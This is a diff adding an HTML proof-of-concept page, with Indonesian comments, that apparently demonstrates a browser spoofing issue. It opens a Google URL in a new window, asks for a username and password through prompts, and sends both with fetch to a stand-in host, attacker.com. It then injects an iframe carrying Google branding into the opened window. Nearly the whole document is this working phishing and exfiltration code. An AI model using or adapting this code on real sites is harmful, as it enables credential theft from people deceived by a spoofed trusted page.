@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">Click to spoof</button>
+<script>
+function spoof() {
+    let win = window.open("https://www.google.com/gen_204", "_blank");
+    // Prompt muncul terlebih dahulu
+    setTimeout(() => {
+        let u = prompt('Enter your username:');
+        let p = prompt('Enter your password:');
+        let exfilUrl = 'https://attacker.com/collect?username=' + encodeURIComponent(u) + '&password=' + encodeURIComponent(p);
+        fetch(exfilUrl).catch(e => console.log("Exfiltration blocked:", e));
+        alert('Your creds:\\nUsername: ' + u + '\\nPassword: ' + p);
+
+        // Setelah prompt, masukkan konten
+        setTimeout(() => {
+            try {
+                if (win && win.document) {
+                    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
+                        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
+                        '<h1>This is NOT Google!</h1>' +
+                        '<p>Your credentials have been collected.</p>' +
+                        '</div>';
+                    let dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(payload);
+                    let iframe = win.document.createElement('iframe');
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100%';
+                    iframe.style.border = 'none';
+                    iframe.src = dataUrl;
+                    win.document.body.appendChild(iframe);
+                }
+            } catch (e) {
+                console.warn("Blocked by browser protections:", e);
+            }
+        }, 500); // Penundaan untuk memastikan jendela siap
+    }, 200); // Penundaan awal untuk prompt
+}
+</script>
+</body>
+</html>
